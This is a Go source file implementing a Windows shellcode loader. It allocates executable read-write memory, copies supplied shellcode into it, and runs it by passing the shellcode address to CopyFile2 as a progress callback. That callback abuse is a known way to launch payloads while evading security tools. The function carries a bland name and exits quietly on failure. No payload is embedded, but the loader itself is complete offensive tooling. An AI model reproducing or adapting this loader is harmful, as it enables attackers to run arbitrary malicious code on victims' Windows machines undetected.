package TT

import (
	"syscall"
	"unsafe"
)

type Copyfile2ExtendedParameters struct {
	dwSize            *Copyfile2ExtendedParameters
	dwCopyFlags       int
	pfCancel          bool
	pProgressRoutine  uintptr
	pvCallbackContext int
}

const (
	MEM_COMMIT               = 0x1000
	MEM_RESERVE              = 0x2000
	PAGE_EXECUTE_READWRITE   = 0x40
	COPY_FILE_FAIL_IF_EXISTS = 0x00000001
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	DeleteFileW   = kernel32.MustFindProc("DeleteFileW")
	CopyFile2     = kernel32.MustFindProc("CopyFile2")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	params := &Copyfile2ExtendedParameters{}
	params.dwSize = params
	params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS
	params.pfCancel = false
	params.pProgressRoutine = addr
	params.pvCallbackContext = 0

	p1, _ := syscall.UTF16PtrFromString("C:\\Windows\\Temp\\backup.log")
	p2, _ := syscall.UTF16PtrFromString("C:\\Windows\\DirectX.log")
	p3, _ := syscall.UTF16PtrFromString("C:\\Windows\\Temp\\backup.log")

	DeleteFileW.Call(uintptr(unsafe.Pointer(p1)))
	CopyFile2.Call(uintptr(unsafe.Pointer(p2)), uintptr(unsafe.Pointer(p3)), (uintptr)(unsafe.Pointer(&params)))
}
